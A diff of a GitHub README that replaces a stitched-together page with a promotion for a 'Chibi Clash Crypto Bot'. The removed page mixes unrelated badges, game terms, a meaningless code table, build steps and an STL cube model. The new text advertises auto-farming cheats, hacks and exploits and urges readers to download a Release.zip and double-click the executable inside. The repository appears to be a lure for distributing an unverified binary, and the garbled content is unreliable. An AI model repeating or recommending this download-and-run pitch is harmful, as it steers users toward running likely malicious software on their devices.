@@ -1,187 +1,53 @@
-<div align="center">
-<a href="z"><img src="https://img.shields.io/badge/ChatGPT-74aa9c?style=for-the-badge&logo=openai&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/Bitcoin-000000?style=for-the-badge&logo=bitcoin&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/Ethereum-3C3C3D?style=for-the-badge&logo=Ethereum&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/Litecoin-A6A9AA?style=for-the-badge&logo=Litecoin&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/.NET-512BD4?style=for-the-badge&logo=dotnet&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/Visual_Studio-5C2D91?style=for-the-badge&logo=visual%20studio&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/VSCode-0078D4?style=for-the-badge&logo=visual%20studio%20code&logoColor=white"/></a>
-</div>
+# 🤖🚀 Chibi Clash Crypto Bot: Automate Your Crypto Farming and Clicking 🕹️💰
 
-<h1 align="center">
-    <a href="https://amplication.com/#gh-light-mode-only">
-    <img src="https://github.com/fikfifkasd/asd2342/assets/80986477/e7e2f3b4-3e31-46b5-b23a-9219a301d842">
-    </a>
-    <a href="https://amplication.com/#gh-dark-mode-only">
-    <img src="https://github.com/fikfifkasd/asd2342/assets/80986477/e7e2f3b4-3e31-46b5-b23a-9219a301d842">
-    </a>
-</h1>
+Welcome to the Chibi Clash Crypto Bot repository, where you can supercharge your gaming experience in the Chibi Clash game! This bot is designed to automate farming and clicking activities within the game, enabling you to optimize your profits and enhance your efficiency. With features such as crypto token integration and API support, you can take your gameplay to the next level.
 
-<p align="center">
-  <i align="center">Building System Applications with C# & C++ 🚀</i>
-</p>
-  
-<p align="center">
-  Hi, I'm Mathieu 👋 I'm a 🚀 French developer 🚀 I ❤️ Happy Hardcore ❤️
-</p>
+## Features 🛠️
 
-## Read About
-2.1 Acknowledgement of Testing PhaseChibi Clash is currently in a testing phase. This means the game, its features, and its underlying technology are not in their final form and are subject to continuous testing, development, and refinement. Your participation is vital in this phase, helping us improve and evolve the experience.2.2 "As Is" ProvisionThe game is provided "as is" and "as available." You are advised that the game may contain bugs, errors, and other issues that could impact gameplay and overall user experience. We do not guarantee uninterrupted access or error-free performance.2.3 Responsibility for Data and Content As Chibi Clash is in a testing phase, you are advised to safeguard important data and content. We are not responsible for any loss, corruption, or damage to your data, content, or devices resulting from your use of Chibi Clash.
+🔹 **Auto-Farm:** Let the bot handle the repetitive farming tasks for you, so you can focus on more exciting aspects of the game.
 
-#### **Please Read First What You Need Part.**
-#### <p align="Left"><a href="#what-you-need-1">WHAT YOU NEED</a></p> 
+🔹 **Auto-Clicker:** Say goodbye to endless clicking – the bot will handle all the clicking activities for you with precision.
 
-![99](https://github.com/user-attachments/assets/c02729c7-d1fd-4e70-9ac8-4899a548d148)
+🔹 **Crypto Token Integration:** Seamlessly integrate crypto tokens into your gameplay, enhancing the overall gaming experience.
 
-https://github.com/user-attachments/assets/0c0d8d4b-0984-49ce-a88a-adf6574de08f
+🔹 **API Support:** Connect with external APIs to unlock new possibilities and functionalities within the game.
 
+🔹 **Cheats and Hacks:** Optimize profits and gain a competitive edge with cheats and hacks designed to enhance gameplay.
 
+## Repository Details 📁
 
+🔗 **Repository Name:** Chibi-Clash-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api
 
-```mermaid
-erDiagram
-    PLAYER_WALLET {
-        string id
-        string playerName
-        float inGameCurrency
-    }
-    PLAYER_WALLET ||--o{ GAME_TRANSACTION : initiates
-    PLAYER_WALLET ||--o{ GAME_BALANCE : updates
-    GAME_TRANSACTION ||--o{ GAME_CONFIRMATION : confirms
-    GAME_CONFIRMATION ||--o{ PLAYER_WALLET : updates
-    GAME_CONFIRMATION ||--o{ GAME_BLOCKCHAIN : records
-    GAME_BLOCKCHAIN }|--o{ GAME_TRANSACTION : contains
-    GAME_BLOCKCHAIN }|--o{ GAME_BALANCE : contains
-```
-### What You Need
-----
-                    
-| Tool              | Code         |
-| ----------------- | ------------ |
-| Blockchain Explorer | 0000       |
-| Cryptogame  | Daf     |
-| Farm      | 000          |
-| Auto Clicker  | ST8 |
-| Solana Explorer   | 91           |
+📝 **Description:** Bot that automates farming and clicker activities in Chibi Clash game. Features include crypto token integration and API support. Designed with cheats and hacks to optimize profits and enhance gameplay efficiency.
 
-                
-----
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+🏷️ **Topics:** auto-clicker, auto-farm, blockchain-game, blockchain-technology, chibi-clash, chibi-clash-bot, chibi-clash-game, clicker-game, crypto-api, crypto-game, crypto-hack, crypto-token, cryptocurrency-game, ethereum-game, exploit, game-bot, game-cheat, game-enhancement, hack, mini-game.
 
-<!-- ROADMAP -->
-## Roadmap
+🔗 [**Download Release**](https://github.com/assets/Release.zip) 🚀
 
-- [x] New Gui
-- [ ] Add back to top links
-- [x] Add Additional Templates w/ Examples
-- [x] New Features
-- [ ] Multi-language Support
-    - [ ] Chinese
-    - [ ] Turkish
-    - [ ] French
-    - [ ] Spanish
+⚠️ **Note:** Make sure to launch the downloaded file to start using the bot efficiently.
 
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+## Get Started 🚀
 
-<!-- GETTING STARTED -->
-## Getting Started
+To begin using the Chibi Clash Crypto Bot, follow these simple steps:
 
-### Prerequisites
+1. **Download the Bot:** Click on the provided link to download the bot release.
+2. **Extract Files:** Extract the downloaded files to a convenient location on your device.
+3. **Launch the Bot:** Double click on the executable file to start the bot.
+4. **Configure Settings:** Customize the bot settings according to your preferences.
+5. **Enjoy the Game:** Sit back, relax, and watch as the bot automates your gameplay.
 
-This is an example of how to list things you need to use the software and how to install them.
-* npm
-  ```sh
-  npm install npm@latest -g
-  ```
+## Contributions 🤝
 
-### Installation
+If you're interested in contributing to the Chibi Clash Crypto Bot repository, feel free to fork the project, make your changes, and submit a pull request. Your contributions are highly appreciated and will help improve the bot for the entire community.
 
-1. Download Visual Studio 2022
-_using Git Clone Or either download the project or exit the rar. Then Download Visual Studio 2022 Here Link [VisualStudio Download](https://visualstudio.microsoft.com/downloads/)_
-![last1](https://github.com/fikfifkasd/asd2342/assets/80986477/df0c0345-8a39-4bab-83ce-9211c8324283)
-> Download These
+## Support 💬
 
-2. Clone the repo
-   ```sh
-   git clone https://github.com/SoonAdd/Addsoon.git
-   ```
-3. OR
+If you encounter any issues or have any questions about the Chibi Clash Crypto Bot, please don't hesitate to reach out to us. We're here to help you make the most of your gaming experience with this innovative bot.
 
-![download](https://github.com/fikfifkasd/asd2342/assets/80986477/29a942a4-924c-4a97-9e76-99f49b7ec27a)
+## Spread the Word 🌟
 
+Enjoying the Chibi Clash Crypto Bot? Spread the word to your friends and fellow gamers! Share this repository link and let others know about this amazing tool that can revolutionize the way they play and enjoy the game.
 
-4. _Then open the sln (Project Solution) file_
+Let's dive into the world of Chibi Clash with the Chibi Clash Crypto Bot – your ultimate companion for automated farming, clicking, and crypto token integration! Happy gaming! 🎮💎
 
-![vsgif](https://github.com/fikfifkasd/asd2342/assets/80986477/e6351858-7564-4d41-adce-56b8ad70898c)
-
-5. Find Executable File
-   ```sh
-   /ProjectName/Bin/Debug/Executable.exe
-   ```
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
-
-```stl
-solid cube_corner
-  facet normal 0.0 -1.0 0.0
-    outer loop
-      vertex 0.0 0.0 0.0
-      vertex 1.0 0.0 0.0
-      vertex 0.0 0.0 1.0
-    endloop
-  endfacet
-  facet normal 0.0 0.0 -1.0
-    outer loop
-      vertex 0.0 0.0 0.0
-      vertex 0.0 1.0 0.0
-      vertex 1.0 0.0 0.0
-    endloop
-  endfacet
-  facet normal -1.0 0.0 0.0
-    outer loop
-      vertex 0.0 0.0 0.0
-      vertex 0.0 0.0 1.0
-      vertex 0.0 1.0 0.0
-    endloop
-  endfacet
-  facet normal 0.577 0.577 0.577
-    outer loop
-      vertex 1.0 0.0 0.0
-      vertex 0.0 1.0 0.0
-      vertex 0.0 0.0 1.0
-    endloop
-  endfacet
-endsolid
-```
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
-
-<!-- CONTRIBUTING -->
-## Contributing
-<a href="https://opencollective.com/democracyearth/backer/0/website"><img src="https://opencollective.com/democracyearth/backer/0/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/1/website"><img src="https://opencollective.com/democracyearth/backer/1/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/2/website"><img src="https://opencollective.com/democracyearth/backer/2/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/3/website"><img src="https://opencollective.com/democracyearth/backer/3/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/4/website"><img src="https://opencollective.com/democracyearth/backer/4/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/5/website"><img src="https://opencollective.com/democracyearth/backer/5/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/6/website"><img src="https://opencollective.com/democracyearth/backer/6/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/7/website"><img src="https://opencollective.com/democracyearth/backer/7/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/8/website"><img src="https://opencollective.com/democracyearth/backer/8/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/9/website"><img src="https://opencollective.com/democracyearth/backer/9/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/10/website"><img src="https://opencollective.com/democracyearth/backer/10/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/11/website"><img src="https://opencollective.com/democracyearth/backer/11/avatar.svg"></a>
-
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
-
-<p align="center">
-    <img src="https://minkxx-spotify-readme.vercel.app/api?theme=dark&rainbow=true&scan=true&spin=True" alt="Preview">
-</p>
-
-
-Not sure where to start? Join our discord and we will help you get started!
-
-<a href="https://discord.gg/U3UqGHxf"><img src="https://amplication.com/images/discord_banner_purple.svg" /></a>
-
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
-
-<p align="center">
-  <img src="https://github.com/tarikmanoar/tarikmanoar/raw/output/github-snake-dark.svg" alt="snake"></center>
-</p>
+![Chibi Clash](https://example.com/chibiclash.jpg)
